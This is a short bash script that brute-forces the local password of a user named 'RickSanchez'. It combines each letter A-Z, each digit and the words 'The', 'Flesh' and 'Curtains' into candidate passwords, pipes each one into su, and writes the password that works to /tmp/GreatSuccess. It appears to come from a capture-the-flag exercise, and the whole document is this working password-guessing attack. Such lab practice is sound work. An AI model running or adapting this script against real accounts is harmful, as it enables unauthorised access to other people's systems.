#!/bin/bash


band=("The" "Flesh" "Curtains")

for a in {A..Z};do
        for b in {0..9};do
                for c in ${band[@]};do
                        echo $a$b$c | su RickSanchez -c "echo password is $a$b$c > /tmp/GreatSuccess"
                        echo $a$b$c
                done
        done
done
